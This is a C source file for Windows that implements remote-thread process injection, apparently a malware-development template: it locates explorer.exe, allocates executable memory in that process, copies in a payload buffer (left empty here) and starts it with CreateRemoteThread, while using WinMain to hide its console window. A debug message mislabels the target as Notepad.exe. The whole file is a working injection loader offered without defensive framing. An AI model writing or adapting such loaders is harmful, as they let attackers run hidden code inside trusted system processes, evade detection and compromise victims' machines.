/*

Notes/Information:

*/

#include <winternl.h>
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>

// Payload Global VAR
unsigned char payload[] = {  };

// Get a handle of the target process
HANDLE FindTargetProcess(const char *processName) {

	int pid = 0;

	// Create a snapshot of what is running on the computer at the moment
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnap) return 0;

	// Create entry from 
	PROCESSENTRY32 processListEntry;
	processListEntry.dwSize = sizeof(PROCESSENTRY32);

	// In case there is an empty of nonexistent process list in the snapshot
	if (!Process32First(hSnap, &processListEntry)) {
		CloseHandle(hSnap);
		return 0;
	}

	// Walkthrough all processes
	while (Process32Next(hSnap, &processListEntry)) {
		// If we find what we are looking for 
		if (lstrcmpiA(processName, processListEntry.szExeFile) == 0) {
			// We take its PID
			pid = processListEntry.th32ProcessID;
			break;
		}
	}

	CloseHandle(hSnap);

	// Return a handle of the target process
	if (pid) {
		printf("Notepad.exe PID = %d\n", pid);
		return OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
					PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
					FALSE, (DWORD) pid);
	}

	return NULL;
}

// Inject into target process's memory space and execute remote thread
int InjectPayload(HANDLE hProcess, unsigned char * payload, unsigned int payloadSize){

	LPVOID pRemoteShellcode = NULL;
	pRemoteShellcode = VirtualAllocEx(hProcess, NULL, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READ);
	WriteProcessMemory(hProcess, pRemoteShellcode, (PVOID)payload, (SIZE_T)payloadSize, (SIZE_T *)NULL);

	HANDLE hThread = NULL;
	hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteShellcode, NULL, 0, NULL);
		if (hThread != NULL) {
			WaitForSingleObject(hThread, 500);
			CloseHandle(hThread);
			return 0;
		}
	return -1;
}

// use WinMain to hide the console
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

	HANDLE hProcess = NULL;
	unsigned int payloadSize = sizeof(payload);

	hProcess = FindTargetProcess("explorer.exe");

	if (hProcess != NULL) {
		InjectPayload(hProcess, payload, payloadSize);
		CloseHandle(hProcess);
	}
	return 0;
}